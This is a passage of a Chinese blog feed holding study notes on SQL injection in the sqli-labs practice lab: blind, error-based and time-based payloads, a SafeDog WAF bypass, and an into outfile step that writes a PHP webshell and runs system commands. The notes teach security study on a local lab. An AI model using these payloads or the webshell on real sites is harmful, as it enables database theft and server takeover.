dual</p><p>③ 获取数据库表及其内容</p><p>在得知表的列数之后，可以通过查询元数据的方式查询表名称、列名称，然后查询数据，如：</p><p><a href="http://www.aaa.org/index.jsp?id=1">http://www.aaa.org/index.jsp?id=1</a> UNION SELECT username, password, null FROM users –</p><p>注意：在查询数据时同样要注意数据类型，否则无法查询，只能一一测试，改变参数的查询位置。</p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Burp,Oracle数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF绕过，安全狗的使用</title>
      <link href="/2024/01/01/WAF%E7%BB%95%E8%BF%87%EF%BC%8C%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/01/01/WAF%E7%BB%95%E8%BF%87%EF%BC%8C%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="安全狗的安装"><a href="#安全狗的安装" class="headerlink" title="安全狗的安装"></a>安全狗的安装</h2><p>1.在虚拟机win10浏览器的安全狗官网，也可以在物理机下载完成之后拖过来。</p><p>官网链接：<a href="https://www.safedog.cn/">https://www.safedog.cn/</a>     </p><p>在首页的免费安全产品下载网站安全狗。下载后先不要安装，默默等待。<br>2.关闭小皮的Apache，加入一个新的Apache到系统服务中，管理员权限打开dos命令行面板，进入phpstudy_pro\Extensions\Apache2.4.39\bin文件夹，输入以下命令</p><p>3.安装的帮助链接：</p><p><a href="https://blog.csdn.net/FY603438169/article/details/128117572">phpstudy环境安装安全狗_phpstudy 安全狗-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">httpd.exe -k install -n apache2.4</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703923927662-0a71ce58-3788-4976-9b87-bfb04d28c63d.png" alt="image.png"><br>3.安装完成后打开系统服务列表查看是否安装成功。win+r 输入services.msc，就能看到系统服务。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703924194205-137e4869-69af-4c52-8ac7-40f316fe14fa.png" alt="image.png"><br>4.安全前先启动Apache2.4服务，点击安全狗安装包安装，安装目录自定义<br>5.用管理员权限启动安全狗。</p><p>6.不使用安全狗时关闭services.msc的apache服务，如果在没有关闭的情况下打开phpstudy的apache服务就会产生端口被占用的情况。</p><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p>1.WAF（Web应用防火墙）是一种安全解决方案，旨在保护Web应用程序免受各种攻击，如SQL注入、跨站脚本（XSS）和命令执行等。然而，由于WAF通常基于正则表达式和预定义的规则集来检测攻击，因此存在被绕过的可能性。<br>2.WAF绕过方法总结，链接:<br><a href="https://blog.51cto.com/u_15072903/4074643">WAF绕过方法总结_51CTO博客_如何绕过waf</a><br>3.安装了安全狗后，以sqli的第1关为例<br>输入<code>?id=1&#39; union select</code>,被安全狗的过滤规则检测到了，只有有union select或者单独的select就会直接拦截。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703926489604-9c1db1db-d658-419e-8c86-4769d0d96022.png" alt="image.png"><br>4.打开Yakit软件，把第一关链接192.168.2.2&#x2F;sqli&#x2F;Less&#x2F;?id&#x3D;1复制到Yakit内置浏览器，然后抓包。<br>5.点击Fuzz，然后在下图位置插入字典。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927865832-e7d97cc8-d142-480e-ae9c-58453e4c949b.png" alt="image.png"><br>6.字典中添加如下内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704091196967-1b6ad3ce-fc70-4816-95a7-914469d17e7b.png" alt="image.png"><br>7.点击发送请求，1,2行数据报错，原因是字典中的空格没有编码。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704091317501-59a742e3-933d-4fa4-b207-6adf649c2352.png" alt="image.png"><br>8.给空格编码%20后，1，2行数据没有报错了。响应大小为5276说明被安全狗拦截了。4~8整个过程被称为模糊测试。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704091836408-6b5ba193-d829-452b-84ac-3a819cbbe172.png" alt="image.png"></p><p>9.在12345处插入6位验证码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704092850626-f66efa29-7940-4091-a927-1207860dfe92.png" alt="image.png"><br>10.得到我们需要的payloads<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704093298003-42fd35f4-ff58-4816-aab3-b0d09e84435b.png" alt="image.png"><br>11.把之前的12345换成00044<br>12.输入以下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;union/*//*//*!00044select*/1,/*//*/!00044database*//*//*//*!00044()*/,3-- -</span><br></pre></td></tr></table></figure><p>结果成功绕过安全狗：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704093728644-e0d33e6f-b6a1-4357-a42d-a38e18f24af2.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WAF,安全狗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs相关知识点总结</title>
      <link href="/2024/01/01/sql-labs%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
      <url>/2024/01/01/sql-labs%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="一-各种盲注手注方法"><a href="#一-各种盲注手注方法" class="headerlink" title="一.各种盲注手注方法"></a>一.各种盲注手注方法</h1><p>以第5关为例：<br>GET-双注入-单引号-字符串-盲注</p><h2 id="1-判断数据库的长度"><a href="#1-判断数据库的长度" class="headerlink" title="1.判断数据库的长度"></a>1.判断数据库的长度</h2><p>?id&#x3D;1’ and length(database())&#x3D;8 – #是否为8，返回You are in…….说明正确。如果将8换成其他数字将都不会有显示</p><h2 id="2-判断数据库的第一个数字："><a href="#2-判断数据库的第一个数字：" class="headerlink" title="2.判断数据库的第一个数字："></a>2.判断数据库的第一个数字：</h2><p>?id&#x3D;1’ and left(database(),1)&gt;’a’ – # a编码是97,而s是115,此时a&lt;s,能够正常返回You are in……,1表示数据库的第1位。<br>还可以利用substr() ascii()函数进行尝试<br>?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where    table_schema&#x3D;database()limit 0,1),1,1))&gt;80– # 能够正常显示You are in……<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703921314257-ea674ead-2c67-40c9-94d0-d3dd35692008.png" alt="image.png"><br>当把80换成102时，显示失败，此时可以判断出表的第一位比80大，比102小，而我们本身已经知道第一张表是email，e的编码是101，符合预期结果。<br>?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where   table_schema&#x3D;database()limit 0,1),2,1))&gt;80– # 将1换成2就可继续查询第一张表的第二位字符。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703921367695-af993316-3389-4664-bd2a-f66fc78db412.png" alt="image.png"><br>?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where     table_schema&#x3D;database() limit 1,1),1,1))&gt;113– #将limit后面的0换成1就可以查第二张表的字符了。</p><h2 id="3-判断列："><a href="#3-判断列：" class="headerlink" title="3.判断列："></a>3.判断列：</h2><p>当我们获得了users表后，我们可以利用 regexp 获取security数据库中 users 表中的列<br>?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;’users’ and column_name regexp ‘^username’ limit 0,1)– #判断users表中是否存在username这一列，存在就会返回You are in……，其他列同理。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703921419448-d439ea62-7f4b-4ebc-9db7-144a86d16e64.png" alt="image.png"><br>利用 ord（）和 mid（）函数获取 users 表的内容   （68对应ASCII码表为D，0x20对应ASCII码为空格，u是117）<br>?id&#x3D;1’ and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D;68– #users表的第一项内容是Dumb的第一个字母是D,所以显示的是You are in….。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703921431298-55a3e2ae-e61a-4c6c-9653-bb6fbb3096bb.png" alt="image.png"><br>?id&#x3D;1’ and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),2,1))&#x3D;117– #，第一行第二个字母是u，显示You are in…..。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703921444661-a850ce82-7090-4b29-8136-ee585d2b0de5.png" alt="image.png"></p><p>这里简单介绍下mysql函数：</p><h2 id="4-IFNULL-函数"><a href="#4-IFNULL-函数" class="headerlink" title="4.IFNULL() 函数"></a>4.IFNULL() 函数</h2><p>语法：IFNULL(expression, alt_value)<br>IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。所以上面的语句就是 CAST(username AS CHAR) 的值不为null,就输出，为null就输出0x20，而0x20又是空格。<br>cast() 函数—–类型转换<br>语法：CAST(value as type);</p><h2 id="5-报错等级："><a href="#5-报错等级：" class="headerlink" title="5.报错等级："></a>5.报错等级：</h2><h3 id="5-1错误报告级别："><a href="#5-1错误报告级别：" class="headerlink" title="5.1错误报告级别："></a>5.1错误报告级别：</h3><p>指定了在什么情况下，脚本代码中的错误（这里的错误是广义的错误，包括 E_NOTICE注意、 E_WARNING警告、 E_ERROR致命错误等）会以错误报告的形式输出。<br>error_reporting(-1); 表示显示所有PHP错误报告，包括将来PHP加入的新的错误级别。 至PHP5.4，E_ALL有同样的行为。<br>error_reporting(0); 表示关闭所有PHP错误报告<br>error_reporting(7); 表示显示 E_ERROR(1) | E_WARING(2) | E_PARSE(4) &#x3D;&#x3D; (1+2+4)<br>以下是常见的报错：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 关闭所有PHP错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 报告简单的运行错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">7</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 报告 E_NOTICE 也挺好 (报告未初始化的变量或者捕获变量名的错误拼写)</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 除了 E_NOTICE，报告其他所有错误</span></span><br><span class="line"><span class="comment">// 这是在 php.ini 里的默认设置</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 报告所有 PHP 错误 (参见 changelog)</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(-<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 和 error_reporting(E_ALL); 一样</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-2值-常量-说明-备注"><a href="#5-2值-常量-说明-备注" class="headerlink" title="5.2值 常量 说明 备注"></a>5.2值 常量 说明 备注</h3><p>1 E_ERROR (integer) 致命的运行时错误。这类错误一般是不可恢复的情况，例如内存分配导致的问题。后果是导致脚本终止不再继续运行。<br>2 E_WARNING (integer) 运行时警告 (非致命错误)。仅给出提示信息，但是脚本不会终止运行。<br>4 E_PARSE (integer) 编译时语法解析错误。解析错误仅仅由分析器产生。<br>8 E_NOTICE (integer) 运行时通知。表示脚本遇到可能会表现为错误的情况，但是在可以正常运行的脚本里面也可能会有类似的通知。<br>16 E_CORE_ERROR (integer) 在PHP初始化启动过程中发生的致命错误。该错误类似 E_ERROR，但是是由PHP引擎核心产生的。 since PHP 4<br>32 E_CORE_WARNING (integer) PHP初始化启动过程中发生的警告 (非致命错误) 。类似 E_WARNING，但是是由PHP引擎核心产生的。 since PHP 4<br>64 E_COMPILE_ERROR (integer) 致命编译时错误。类似E_ERROR, 但是是由Zend脚本引擎产生的。 since PHP 4<br>128 E_COMPILE_WARNING (integer) 编译时警告 (非致命错误)。类似 E_WARNING，但是是由Zend脚本引擎产生的。 since PHP 4<br>256 E_USER_ERROR (integer) 用户产生的错误信息。类似 E_ERROR, 但是是由用户自己在代码中使用PHP函数 trigger_error()来产生的。 since PHP 4<br>512 E_USER_WARNING (integer) 用户产生的警告信息。类似 E_WARNING, 但是是由用户自己在代码中使用PHP函数 trigger_error()来产生的。 since PHP 4<br>1024 E_USER_NOTICE (integer) 用户产生的通知信息。类似 E_NOTICE, 但是是由用户自己在代码中使用PHP函数 trigger_error()来产生的。 since PHP 4<br>2048 E_STRICT (integer) 启用 PHP 对代码的修改建议，以确保代码具有最佳的互操作性和向前兼容性。 since PHP 5<br>4096 E_RECOVERABLE_ERROR (integer) 可被捕捉的致命错误。 它表示发生了一个可能非常危险的错误，但是还没有导致PHP引擎处于不稳定的状态。 如果该错误没有被用户自定义句柄捕获 (参见 set_error_handler())，将成为一个 E_ERROR　从而脚本会终止运行。 since PHP 5.2.0<br>8192 E_DEPRECATED (integer) 运行时通知。启用后将会对在未来版本中可能无法正常工作的代码给出警告。 since PHP 5.3.0<br>16384 E_USER_DEPRECATED (integer) 用户产少的警告信息。 类似 E_DEPRECATED, 但是是由用户自己在代码中使用PHP函数 trigger_error()来产生的。 since PHP 5.3.0<br>30719 E_ALL (integer) E_STRICT出外的所有错误和警告信息。 30719 in PHP 5.3.x, 6143 in PHP 5.2.x, 2047 previously</p><p>上面的值（数值或者符号）用于建立一个二进制位掩码，来制定要报告的错误信息。可以使用按位运算符来组合这些值或者屏蔽某些类型的错误。请注意，在 php.ini 之中，只有’|’, ‘~’, ‘!’, ‘^’ 和 ‘&amp;’ 会正确解析。</p><h1 id="二-报错注入："><a href="#二-报错注入：" class="headerlink" title="二.报错注入："></a>二.报错注入：</h1><p>0x3a对应ASCII码为 ：（冒号）  0x7e对应ASCII码为 ~<br>mysql函数：<br>floor()    向下取整     floor函数返回小于等于该值的最大整数.</p><h2 id="1-首先使用报错注入"><a href="#1-首先使用报错注入" class="headerlink" title="1.首先使用报错注入"></a>1.首先使用报错注入</h2><p><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a– #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703926706023-1ca3eee1-5753-4550-8f67-66d5046088d6.png" alt="image.png"></p><p>或者这样写（更容易理解点，本文后面讲到双查询注入会解释该语句的意思与原理）：<br><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a– #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703926741429-24ae1eb6-b9cf-4afe-b889-7403755c349e.png" alt="image.png"></p><h2 id="2-利用-double-数值类型超出范围进行报错注入-测试失败"><a href="#2-利用-double-数值类型超出范围进行报错注入-测试失败" class="headerlink" title="2.利用 double 数值类型超出范围进行报错注入(测试失败)"></a>2.利用 double 数值类型超出范围进行报错注入(测试失败)</h2><p><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ union select (exp(~(select * FROM (SELECT USER())a))),2,3– #</p><h2 id="3-利用-bigint-溢出进行报错注入-失败"><a href="#3-利用-bigint-溢出进行报错注入-失败" class="headerlink" title="3.利用 bigint 溢出进行报错注入(失败)"></a>3.利用 bigint 溢出进行报错注入(失败)</h2><p><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ union select (!(select * from (select user())x)-~0),2,3– #</p><h2 id="4-xpath-函数报错注入"><a href="#4-xpath-函数报错注入" class="headerlink" title="4.xpath 函数报错注入"></a>4.xpath 函数报错注入</h2><p><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ and extractvalue(1,concat(0x7e,(select @@version),0x7e))– #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703926962701-ed555c03-e97d-4c3d-9a7f-bd34c9777833.png" alt="image.png"></p><h2 id="5-利用数据的重复性"><a href="#5-利用数据的重复性" class="headerlink" title="5.利用数据的重复性"></a>5.利用数据的重复性</h2><p><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x– #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927041125-7af2d6c7-7dc1-4a35-aecc-ff80fc3fbbb2.png" alt="image.png"></p><h1 id="三-延时盲注"><a href="#三-延时盲注" class="headerlink" title="三.延时盲注"></a>三.延时盲注</h1><p>15—&gt;ASCII码：s</p><h2 id="1-BENCHMARK-函数"><a href="#1-BENCHMARK-函数" class="headerlink" title="1.BENCHMARK()函数"></a>1.BENCHMARK()函数</h2><p>   BENCHMARK(count,expr)<br>   BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。<br>报告的时间是客户端的经过时间，不是在服务器端的CPU时间。执行BENCHMARK()若干次可能是明智的，并且注意服务器机器的负载有多重来解释结果</p><h2 id="2-encode-函数"><a href="#2-encode-函数" class="headerlink" title="2.encode()函数"></a>2.encode()函数</h2><p>ENCODE(str, pass_str)：该函数使用pass_str作为密码来加密字符串str，其加密的结果可以通过DECODE()函数来解密。该函数返回的结果是一个同str等长。DECODE(crypt_str, pass_str)：该函数使用pass_str作为密码来解密使用ENCODE()加密后的字符串crypt_str。</p><p>3.利用 sleep()函数进行注入–（正确页面无明显延迟，错误有明显的延迟）<br><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))– #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927458875-cfa654dc-b615-4035-ba6c-fe567fb9acd6.png" alt="image.png"><br>当错误的时候会有 5 秒的时间延时:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927487867-f9ed65d7-9787-4c15-80cf-7e1be4e5d83d.png" alt="image.png"></p><p>2.利用 BENCHMARK()进行延时注入——这个比较难理解，需要mysql知识点较多，已触及知识盲区，想了解自行解决，反正我是不行了。<br><a href="http://192.168.2.110/sqli/Less-5/?id=1">http://192.168.2.110/sqli/Less-5/?id=1</a>‘ UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1– #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927590105-8c412a26-6452-412b-abce-481dcd53f90d.png" alt="image.png"><br>当结果正确的时候，运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次，会占用一段时间。</p><h1 id="四-导出文件"><a href="#四-导出文件" class="headerlink" title="四.导出文件"></a>四.导出文件</h1><h2 id="1-导出文件整体思路"><a href="#1-导出文件整体思路" class="headerlink" title="1. 导出文件整体思路"></a>1. 导出文件整体思路</h2><p>先导出文件，导出文件就是可以向服务器写入文件,但是利用的时候要知道数据库,网站的路径，但在Less-7下我们无法获取到网站路径，因为它报错不在返回报错的数据库信息，那么怎么办？很简单，在Less 1-6关中是返回报错信息的，那么我们随便挑一关进行报错注入，来获取我们想要的信息，这里以Lese-1为例获取网站的绝对路径：(@@datadir获取数据库存储数据路径 ，@@basedir是MYSQL获取安装路径)<br><a href="http://192.168.2.110/sqli/Less-1/?id=-1">http://192.168.2.110/sqli/Less-1/?id=-1</a>‘ union select 1,2,@@datadir – #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927719327-419c917d-d296-493d-8c57-82edbdffda26.png" alt="image.png"><br>@@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下，那么结合@@datadir我们可以推断出网站的绝对路径为 C:\phpStudy\www\，上图是后面用来安全狗之后的路径。</p><h2 id="2-读写权限测试："><a href="#2-读写权限测试：" class="headerlink" title="2.读写权限测试："></a>2.读写权限测试：</h2><p>id&#x3D;1’)) and (select count(*) from mysql.user)&gt;0 –+ 如果返回正常则有读取权限<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927913478-fd802a23-f0e9-4979-be4a-ec63b2876a2a.png" alt="image.png"></p><h2 id="3-利用into-outfile-进行演示："><a href="#3-利用into-outfile-进行演示：" class="headerlink" title="3.利用into outfile 进行演示："></a>3.利用into outfile 进行演示：</h2><p><a href="http://192.168.2.110/sqli/Less-7/?id=1">http://192.168.2.110/sqli/Less-7/?id=1</a>‘)) union select 1,2,3 into outfile “C:\phpStudy\WWW\sqli\Less-7\test.txt” – #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703927991848-aee128f1-ba84-4437-a8b4-831b63cbf0e3.png" alt="image.png"><br>上图中显示 sql 出错了，因为根目录错了。</p><h2 id="4-导出文件获得所需要的信息"><a href="#4-导出文件获得所需要的信息" class="headerlink" title="4.导出文件获得所需要的信息"></a>4.导出文件获得所需要的信息</h2><p>这里以第一关为例：<br>?id&#x3D;-1’ union select 1,@@datadir,3– -显示phpstudy的网站根目录。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703341500246-d1f888c3-d9b8-4a76-a49c-8aaea7c9629b.png" alt="image.png"><br>secure_file_priv&#x3D;””将这段代码放入my.ini的文本中。这个文本的位置在phpstudy的设置中，点击配置文件，mysql.ini。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703341693015-72840272-40f7-411c-abc7-5b0f52356f5f.png" alt="image.png"><br>之后输入这段代码：<br>?id&#x3D;-1’ union select 1,@@datadir,@@secure_file_priv – -，password这里显示为空说明可以注入，在没有这个secure_file_priv&#x3D;””时password显示的是NULL。NULL代表不能在任何地方注入文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703341872977-3d8d342a-bbf5-45a7-88e8-75fc610e8aae.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php ,phpinfo()  ?>“ into outfile “C:\phpstudy_pro\WWW\phpinfo.php” – -<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343490023-5a004dbb-1deb-4a6f-8bae-3be68f12774a.png" alt="image.png"><br>此时发现在www的根目录下自动产生了phpinfo.php。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703342429374-71359c2d-3daf-45e6-b70a-dcc96aff40e3.png" alt="image.png"><br>?id&#x3D;-1’ union select 1,@@datadir,”<?php @system($_GET[a]);  ?>“ into outfile “C:\phpstudy_pro\WWW\tfk.php” – -#在windows中用&#x2F;&#x2F;表示&#x2F;。第一个&#x2F;表示转义符，两个&#x2F;才能表示本身的含义。system表示系统命令执行函数，这个函数通过get参数进行执行，创造了一个webshell后台。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703342328099-4e9cee26-7456-432c-9893-cfb08f1cc290.png"><br>打开网站输入?a&#x3D;dir<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343632508-e42536c9-b428-4a38-8f7d-85936e9eefbf.png" alt="image.png"><br>打开网站输入?a&#x3D;whoami<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343789595-202e1326-e6fd-48e4-b0fb-3ba356e65b71.png" alt="image.png"><br>打开网站输入?a&#x3D;systeminfo输出系统的基本信息<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703343915907-1d88aa82-691c-4cb1-b29e-86221a30ffcd.png" alt="image.png"><br>注意：<br>对文件进行导入导出首先得要有足够的权限，<br>但是mysql默认不能导入和导出文件，这与secure_file_priv的值有关（默认为null)<br>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。<br>1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出<br>2、当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制<br>用以下命令查看secure_file_priv的值<br>如果是null，想得到导入导出权限，可以在my.ini文件[mysqld]的后面加上secure_file_priv&#x3D;’’（两个英文单引号)，然后重启phpstudy即可<br>还要注意的是：<br>1、outfire 后面的路径为绝对路径且存在<br>2、要有足够的权限<br>3、注入的内容也可以是字符串，句子<br>4、要想注入新内容，需要新的文件名</p><p>这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传test.php，下次再上传test.php，就是无效命令了，也就是新的test.php中的内容并不会覆盖之前的test.php</p><p>导出函数：<br>@@datadir——数据库存储路径<br>@@basedir——Mysql安装路径<br>dumpfile——导出文件，类似outfile；不同的是，dumpfile一次导出一行，会和limit结合使用<br>load_file()——将文件导入mysql，用法select load_file(“文件路径”)<br>使用select … into outfile以逗号分隔字段的方式将数据导入到一个文件中：<br>select * into outfile ‘D:\log1.txt’ fields terminated by ‘,’ from log.log1<br>将刚刚导出的文件log1.txt导入到表log1相同结构的log2中：<br>load data infile ‘D:\log1.txt’ into table aa.log2 fields terminated by ‘,’<br>使用select * into outfile导出：<br>select * into outfile ‘D:\test.txt’ fields terminated by ‘,’ optionally enclosed by ‘“‘ lines terminated by ‘\n’ from test.table</p><p>导入：<br>load data infile ‘&#x2F;tm&#x2F;fi.txt’ into table test.fii fields terminated by ‘,’ optionally enclosed by ‘“‘ lines terminated by ‘\n’<br>fields terminated by ‘,’——字段间分割符<br>optionally enclosed by ‘“‘——将字段包围，对数值型无效<br>lines terminated by ‘\n’——换行符</p><h1 id="五-导出实例："><a href="#五-导出实例：" class="headerlink" title="五.导出实例："></a>五.导出实例：</h1><h2 id="1-获取字段数："><a href="#1-获取字段数：" class="headerlink" title="1.获取字段数："></a>1.获取字段数：</h2><p><a href="http://192.168.2.110/sqli/Less-7/?id=1">http://192.168.2.110/sqli/Less-7/?id=1</a>‘)) order by 3 – #<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703928612525-98a98000-9ac5-4969-bc5e-97af9a13cfab.png" alt="image.png"></p><h2 id="2-导出数据库名-由于网站根目录变化就不展示"><a href="#2-导出数据库名-由于网站根目录变化就不展示" class="headerlink" title="2.导出数据库名(由于网站根目录变化就不展示)"></a>2.导出数据库名(由于网站根目录变化就不展示)</h2><p><a href="http://192.168.2.110/sqli/Less-7/?id=-1">http://192.168.2.110/sqli/Less-7/?id=-1</a>‘)) union select 1,user(),database() into outfile “C:\phpStudy\WWW\sqli\Less-7\aaa.txt” – #</p><h2 id="3-导出表名"><a href="#3-导出表名" class="headerlink" title="3.导出表名"></a>3.导出表名</h2><p><a href="http://192.168.2.110/sqli/Less-7/?id=-1">http://192.168.2.110/sqli/Less-7/?id=-1</a>‘)) union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’security’ into outfile “C:\phpStudy\WWW\sqli\Less-7\bbb.txt” – #</p><h2 id="4-导出字段名"><a href="#4-导出字段名" class="headerlink" title="4.导出字段名"></a>4.导出字段名</h2><p><a href="http://192.168.2.110/sqli/Less-7/?id=-1">http://192.168.2.110/sqli/Less-7/?id=-1</a>‘)) union select 1,2,column_name from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ into outfile “C:\phpStudy\WWW\sqli\Less-7\ccc.txt” – #</p><h2 id="5-导出数据"><a href="#5-导出数据" class="headerlink" title="5.导出数据"></a>5.导出数据</h2><p><a href="http://192.168.2.110/sqli/Less-7/?id=-1">http://192.168.2.110/sqli/Less-7/?id=-1</a>‘)) union select * from users into outfile “C:\phpStudy\WWW\sqli\Less-7\ddd.txt” – #</p><h1 id="六-get和post请求的区别："><a href="#六-get和post请求的区别：" class="headerlink" title="六.get和post请求的区别："></a>六.get和post请求的区别：</h1><ol><li>get是从服务器上获取数据，post是向服务器传送数据。</li><li>GET请求把参数包含在URL中，将请求信息放在URL后面，POST请求通过request body传递参数，将请求信息放置在报文体中。</li><li>get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。</li><li>get安全性非常低，get设计成传输数据，一般都在地址栏里面可以看到，post安全性较高，post传递数据比较隐私，所以在地址栏看不到， 